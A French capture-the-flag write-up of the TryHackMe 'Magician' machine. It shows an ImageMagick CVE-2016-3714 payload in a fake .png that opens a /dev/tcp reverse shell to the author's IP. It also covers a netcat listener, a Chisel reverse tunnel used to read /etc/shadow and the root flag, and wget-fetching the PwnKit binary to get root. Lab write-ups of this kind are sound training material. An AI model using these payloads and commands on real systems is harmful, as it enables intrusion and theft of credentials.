# Magician !

La VM traite de ImageMagik et de la CVE-2016-3714.
On va tester tout cela ! :)

# Enum
## Nmap
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-05 08:11 EST
Nmap scan report for 10.10.56.0
Host is up (0.034s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 2.0.8 or later
8080/tcp open  http-proxy
8081/tcp open  http       nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.07 seconds
```
On vois ici 3 port, le 21 pour FTP, et 8080,8081 pour un serveur web.
URL : http://10.10.56.0:8081/

Il s'agit d'un site qui convertie les images .png en .jpg.

# Exploit
Il parle de la **CVE-2016-3714** qui est une CVE concernant ImageMagik et permet d'executer des commandes via une fausse image (ou une vrai piéger :))

Plus d'info et exploit [ici](https://www.exploit-db.com/exploits/39767)
On va utiliser le payload trouvable sur le repo de [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20ImageMagick)

On créer donc un fichier avec l'extension **.png**
```
nano test.png
```
Puis on colle le payload dedans:
```
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/10.14.59.209/1234 0<&1 2>&1'
pop graphic-context
pop graphic-context
```
Ensuite, il sufit d'ouvrir un listener:
```
nc -lnvp 1234
```
puis d'upload le fichier sur le site, et nous voila avec un revshell :
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.14.59.209] from (UNKNOWN) [10.10.56.0] 43670
sh: cannot set terminal process group (986): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ 
```
# Privesc to root !
Dans le dossier /home de l'user **magician** on retrouve ce fichier:
```
spring-boot-magician-backend-0.0.1-SNAPSHOT.jar
```
On regarde ce qu'il y a dedans a la recherche d'information utile:
```
jar -tf spring-boot-magician-backend-0.0.1-SNAPSHOT.jar
```
Plein de chose mais rien d'utile.

Je lance copie Linpeas et l'execute, il trouve un truc intéressant:
```                                                                                                            
tcp        0      0 0.0.0.0:8081            0.0.0.0:*               LISTEN      -                                                                                                         
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6666          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      986/java            
tcp6       0      0 :::21                   :::*                    LISTEN      -
```
Le port 6666 est suspect.

Je vais le rerouter vers moi afin de voir ce qu'il y a derriere, pour cela, je vais utiliser l'outil [Chisel](https://github.com/jpillora/chisel) qui est un tunel TCP/UDP.
Je démarre le tunel sur ma machine :
```
chisel server -p 9001 --reverse
2023/12/05 11:10:57 server: Reverse tunnelling enabled
2023/12/05 11:10:57 server: Fingerprint ad4CZVn3A4nUKA0Xmv8X+I1tceh7Oczf2HmRcETN7xw=
2023/12/05 11:10:57 server: Listening on http://0.0.0.0:9898
```
Je copie et lance Chisel en mode client sur la machine cible:
```
./chisel client 10.14.59.209:9001 R:9002:127.0.0.1:6666
```
Je tombe sur une page web qui me demande d'entrer le nom d'un fichier.
J'entre **/etc/passwd** et cela me le renvoi encoder en base64.
Je tente avec **/etc/shadow** et je le recoit aussi en base64.

Cela veux dire que cette application a les droits **root**.

Je regarde donc **/root/root.txt** pour voir et je récupère bien le flag :
```
THM{magic_*******************_mad}
```
# Root cheat mod !
Pareil que pas mal de VM présente sur THM, elle est vulnérable avec PwnKit :
```
magician@magician:/tmp$ wget 10.14.59.209/PwnKit
--2023-12-05 10:06:32--  http://10.14.59.209/PwnKit
Connecting to 10.14.59.209:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: ‘PwnKit’

PwnKit              100%[===================>]  17.62K  --.-KB/s    in 0.03s   

2023-12-05 10:06:32 (508 KB/s) - ‘PwnKit’ saved [18040/18040]

magician@magician:/tmp$ chmod +x PwnKit 
magician@magician:/tmp$ ./PwnKit 
root@magician:/tmp#
```
